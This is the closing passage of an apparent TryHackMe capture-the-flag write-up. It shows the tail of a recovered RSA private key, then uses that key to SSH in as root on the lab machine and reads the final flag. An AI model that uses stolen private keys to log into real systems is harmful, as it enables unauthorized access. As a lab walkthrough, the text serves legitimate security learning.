knJ1V6wrLgd2qPq2r5g0a/Qk2fL0toxFbnsQRsueVfPwCQWTjSo/Wg==
-----END RSA PRIVATE KEY-----
```

Paste the above in to a new file on Kali. Change permissions:

```text
┌──(root💀kali)-[~/thm/cooctus]
└─# chmod 600 id_rsa
```

Now let's try it:

```text
┌──(root💀kali)-[~/thm/cooctus]
└─# ssh root@cooctus.thm -i id_rsa
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)

  System information as of Tue Apr 20 21:14:39 UTC 2021

  System load:  0.08               Processes:           106
  Usage of /:   35.0% of 18.57GB   Users logged in:     0
  Memory usage: 34%                IP address for eth0: 10.10.139.176
  Swap usage:   0%

Last login: Sat Feb 20 22:22:12 2021 from 172.16.228.162
root@cchq:~# 
```

We're in as root at last. Let's get the last flag and we're finished:

```text
root@cchq:~# cat root.txt
THM{HIDDEN}
```

All done. See you next time.
